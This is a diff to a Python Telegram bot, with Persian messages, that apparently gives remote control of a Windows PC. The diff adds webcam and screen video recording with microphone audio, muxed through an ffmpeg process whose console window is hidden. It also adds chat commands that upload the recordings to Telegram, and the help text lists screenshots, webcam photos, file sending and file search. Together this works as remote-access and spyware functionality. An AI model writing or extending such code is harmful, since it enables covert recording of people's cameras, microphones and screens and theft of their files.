@@ -235,91 +235,172 @@ def find_file(root: str, pattern: str, limit: int = 20) -> list:
 
 # ---------------- Screen Recorder ----------------
 
-class ScreenRecorder:
-    """ضبط ویدیویی صفحه — بدون ffmpeg، فقط mss + OpenCV"""
-    def __init__(self):
+# ---------------- Video Recorder (video + audio) ----------------
+
+class VideoRecorder:
+    """ضبط ویدیو با صدا — صفحه یا وب‌کم — mux با ffmpeg (imageio-ffmpeg)"""
+    def __init__(self, mode: str, prefix: str):
+        self.mode = mode            # "screen" | "webcam"
+        self.prefix = prefix
         self.recording = False
         self.path = None
         self.start_time = None
+        self.duration = 0
+        self.has_audio = False
         self._thread = None
-        self._writer = None
 
     def start(self):
         if self.recording:
             return None, "already"
-        import cv2  # noqa
-        self.path = os.path.join(DL_DIR, f"rec_{datetime.now():%Y%m%d_%H%M%S}.mp4")
+        self.path = os.path.join(
+            DL_DIR, f"{self.prefix}_{datetime.now():%Y%m%d_%H%M%S}.mp4")
         self.recording = True
+        self.has_audio = False
         self.start_time = datetime.now()
         self._thread = threading.Thread(target=self._run, daemon=True)
         self._thread.start()
         return self.path, "started"
 
-    def _run(self):
-        import mss
+    def _record_video(self, out_path):
         import cv2
         import numpy as np
-        try:
+        if self.mode == "screen":
+            import mss
             with mss.mss() as s:
-                mon = s.monitors[0]   # کل صفحه‌ها ترکیبی
+                mon = s.monitors[0]
                 w = mon["width"] - (mon["width"] % 2)
                 h = mon["height"] - (mon["height"] % 2)
                 region = {"left": mon["left"], "top": mon["top"],
                           "width": w, "height": h}
-                fourcc = cv2.VideoWriter_fourcc(*"mp4v")
-                self._writer = cv2.VideoWriter(self.path, fourcc, 12, (w, h))
+                writer = cv2.VideoWriter(out_path,
+                                         cv2.VideoWriter_fourcc(*"mp4v"),
+                                         12, (w, h))
                 while self.recording:
-                    raw = np.array(s.grab(region))          # BGRA
-                    frame = cv2.cvtColor(raw, cv2.COLOR_BGRA2BGR)
-                    self._writer.write(frame)
-                    time.sleep(1 / 12)                      # ~12 fps
+                    raw = np.array(s.grab(region))
+                    writer.write(cv2.cvtColor(raw, cv2.COLOR_BGRA2BGR))
+                    time.sleep(1 / 12)
+                writer.release()
+        else:
+            cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
+            if not cap.isOpened():
+                raise RuntimeError("وب‌کم در دسترس نیست")
+            # گرم‌کردن: تا اولین فریم واقعی — بدون تحمیل رزولوشن
+            frame = None
+            for _ in range(30):
+                ret, f = cap.read()
+                if ret and f is not None:
+                    frame = f
+                    break
+                time.sleep(0.1)
+            if frame is None:
+                cap.release()
+                raise RuntimeError("وب‌کم فریم نداد")
+            h, w = frame.shape[:2]
+            w -= w % 2
+            h -= h % 2
+            writer = cv2.VideoWriter(out_path,
+                                     cv2.VideoWriter_fourcc(*"mp4v"),
+                                     15, (w, h))
+            writer.write(frame)   # فریم اول
+            while self.recording:
+                ret, f2 = cap.read()
+                if not ret:
+                    continue
+                writer.write(f2)
+            cap.release()
+            writer.release()
+
+    def _record_audio(self, wav_path):
+        """ضبط میکروفون تا وقتی recording=True — خروجی wav"""
+        try:
+            import sounddevice as sd
+            import wave
+            sr = 44100
+            stream = sd.InputStream(samplerate=sr, channels=1, dtype="int16")
+            stream.start()
+            chunks = []
+            with stream:
+                while self.recording:
+                    data, _ = stream.read(4410)   # 0.1s
+                    chunks.append(data.copy())
+            with wave.open(wav_path, "wb") as w:
+                w.setnchannels(1)
+                w.setsampwidth(2)
+                w.setframerate(sr)
+                w.writeframes(b"".join(chunks))
+            return os.path.exists(wav_path) and os.path.getsize(wav_path) > 1000
         except Exception as e:
-            log.error("recorder error: %s", e)
+            log.warning("audio record unavailable: %s", e)
+            return False
+
+    def _mux(self, video_only: str, wav: str, final: str) -> bool:
+        """ادغام ویدیو + صدا با ffmpeg"""
+        try:
+            import imageio_ffmpeg
+            ffmpeg = imageio_ffmpeg.get_ffmpeg_exe()
+            r = subprocess.run(
+                [ffmpeg, "-y", "-i", video_only, "-i", wav,
+                 "-c:v", "copy", "-c:a", "aac", "-b:a", "96k",
+                 "-shortest", final],
+                capture_output=True, text=True, timeout=180,
+                creationflags=0x08000000)
+            return r.returncode == 0 and os.path.exists(final) \
+                and os.path.getsize(final) > 10000
+        except Exception as e:
+            log.warning("mux failed: %s", e)
+            return False
+
+    def _run(self):
+        vid_tmp = self.path.replace(".mp4", "_video_only.mp4")
+        wav_tmp = self.path.replace(".mp4", "_audio.wav")
+        try:
+            wav_holder = {"ok": False}
+
+            def audio_worker():
+                wav_holder["ok"] = self._record_audio(wav_tmp)
+
+            at = threading.Thread(target=audio_worker, daemon=True)
+            at.start()
+            # ویدیو (بلاک تا پایان ضبط)
+            self._record_video(vid_tmp)
+            self.duration = int((datetime.now() - self.start_time).total_seconds())
+            at.join(timeout=30)
+
+            if wav_holder.get("ok") and os.path.exists(wav_tmp):
+                if self._mux(vid_tmp, wav_tmp, self.path):
+                    self.has_audio = True
+                else:
+                    os.replace(vid_tmp, self.path)
+            else:
+                os.replace(vid_tmp, self.path)
+        except Exception as e:
+            log.error("recorder (%s) error: %s", self.mode, e)
+            try:
+                if os.path.exists(vid_tmp) and not os.path.exists(self.path):
+                    os.replace(vid_tmp, self.path)
+            except Exception:
+                pass
         finally:
-            if self._writer:
-                self._writer.release()
-            self._writer = None
+            for tmp in (vid_tmp, wav_tmp):
+                try:
+                    if tmp != self.path and os.path.exists(tmp):
+                        os.remove(tmp)
+                except Exception:
+                    pass
 
     def stop(self):
         if not self.recording:
             return None
         self.recording = False
         if self._thread:
-            self._thread.join(timeout=15)
-        dur = datetime.now() - self.start_time
-        secs = int(dur.total_seconds())
+            self._thread.join(timeout=60)
         size = os.path.getsize(self.path) if os.path.exists(self.path) else 0
-        return {"path": self.path, "seconds": secs, "size_mb": size / 1e6}
+        return {"path": self.path, "seconds": self.duration,
+                "size_mb": size / 1e6, "has_audio": self.has_audio}
 
 
-recorder = ScreenRecorder()
-
-
-def send_video(chat_id, path: str, caption: str = "", delete_after: bool = False):
-    log.info("SEND VIDEO → %s", path)
-    sent_ok = False
-    try:
-        with open(path, "rb") as f:
-            r = requests.post(
-                f"{API}/sendVideo",
-                data={"chat_id": chat_id, "caption": caption[:1000],
-                      "supports_streaming": "true"},
-                files={"video": (os.path.basename(path), f)},
-                timeout=600, proxies=PROXIES,
-            )
-        sent_ok = bool(r.json().get("ok"))
-        if not sent_ok:
-            send(chat_id, f"خطا در ارسال ویدیو: {r.json().get('description', '?')}")
-    except Exception as e:
-        log.error("send_video failed: %s", e)
-        send(chat_id, f"خطا در ارسال ویدیو: {e}")
-    if delete_after and sent_ok and os.path.exists(path):
-        try:
-            os.remove(path)
-            log.info("CLEANED (auto-delete) → %s", path)
-        except Exception as e:
-            log.error("auto-delete failed: %s", e)
-    return sent_ok
+screen_recorder = VideoRecorder("screen", "rec")
+webcam_recorder = VideoRecorder("webcam", "camrec")
 
 
 # ---------------- Webcam ----------------
@@ -409,9 +490,12 @@ def handle_command(chat_id: int, text: str):
             "دستورات سریع:\n"
             "📸 /shot — اسکرین‌شات\n"
             "📷 /cam — عکس از وب‌کم\n"
-            "🎥 /rec — شروع ضبط ویدیوی صفحه\n"
-            "⏹ /recstop — قطع ضبط\n"
-            "📤 /recsend — ارسال ویدیو ضبط‌شده\n"
+            "🎥 /rec — شروع ضبط ویدیوی صفحه (با صدا)\n"
+            "⏹ /recstop — قطع ضبط صفحه\n"
+            "📤 /recsend — ارسال ویدیوی صفحه\n"
+            "🎥 /camrec — شروع ضبط وب‌کم (با صدا)\n"
+            "⏹ /camrecstop — قطع ضبط وب‌کم\n"
+            "📤 /camsend — ارسال ویدیوی وب‌کم\n"
             "📄 /file مسیر — ارسال فایل\n"
             "📂 /ls مسیر — لیست پوشه\n"
             "🔍 /find اسم — جستجوی فایل\n"
@@ -504,8 +588,47 @@ def handle_command(chat_id: int, text: str):
         except Exception as e:
             send(chat_id, f"⚠ {e}")
 
+    elif cmd == "/camrec":
+        if screen_recorder.recording:
+            send(chat_id, "⚠ ضبط صفحه در حال اجراست — اول /recstop")
+            return
+        path, status = webcam_recorder.start()
+        if status == "already":
+            send(chat_id, "🔴 ضبط وب‌کم از قبل در حال اجراست! /camrecstop")
+        else:
+            send(chat_id, "🔴 ضبط ویدیو از وب‌کم (با صدا) شروع شد!\n"
+                          "⏹ قطع: /camrecstop\n"
+                          "📤 ارسال: /camsend")
+
+    elif cmd == "/camrecstop":
+        info = webcam_recorder.stop()
+        if info is None:
+            send(chat_id, "⚠ ضبط وب‌کمی در حال اجرا نیست. شروع: /camrec")
+        else:
+            audio = "با صدا ✓" if info["has_audio"] else "بدون صدا ⚠"
+            send(chat_id, f"⏹ ضبط وب‌کم تمام شد! ({audio})\n"
+                          f"⏱ مدت: {info['seconds']} ثانیه\n"
+                          f"💾 حجم: {info['size_mb']:.1f} MB\n"
+                          f"📤 ارسال: /camsend")
+
+    elif cmd == "/camsend":
+        if webcam_recorder.recording:
+            send(chat_id, "⚠ هنوز داری ضبط می‌کنی! اول /camrecstop بزن.")
+            return
+        p = webcam_recorder.path
+        if p and os.path.exists(p):
+            size_mb = os.path.getsize(p) / 1e6
+            if size_mb > MAX_MB:
+                send(chat_id, f"⚠ ویدیو {size_mb:.0f}MB است — بالاتر از سقف "
+                              f"{MAX_MB}MB تلگرام. ضبط کوتاه‌تر کن.")
+                return
+            send(chat_id, "📤 در حال ارسال ویدیوی وب‌کم…")
+            send_video(chat_id, p, "🎬 وب‌کم", delete_after=True)
+        else:
+            send(chat_id, "⚠ ویدیویی برای ارسال نیست. اول ضبط کن: /camrec")
+
     elif cmd == "/rec":
-        path, status = recorder.start()
+        path, status = screen_recorder.start()
         if status == "already":
             send(chat_id, "🔴 ضبط از قبل در حال اجراست! اول /recstop بزن.")
         else:
@@ -514,7 +637,7 @@ def handle_command(chat_id: int, text: str):
                           "📤 ارسال بعد از قطع: /recsend")
 
     elif cmd == "/recstop":
-        info = recorder.stop()
+        info = screen_recorder.stop()
         if info is None:
             send(chat_id, "⚠ ضبطی در حال اجرا نیست. شروع: /rec")
         else:
@@ -524,10 +647,10 @@ def handle_command(chat_id: int, text: str):
                           f"📤 ارسال: /recsend")
 
     elif cmd == "/recsend":
-        if recorder.recording:
+        if screen_recorder.recording:
             send(chat_id, "⚠ هنوز داری ضبط می‌کنی! اول /recstop بزن.")
             return
-        p = recorder.path
+        p = screen_recorder.path
         if p and os.path.exists(p):
             size_mb = os.path.getsize(p) / 1e6
             if size_mb > MAX_MB:
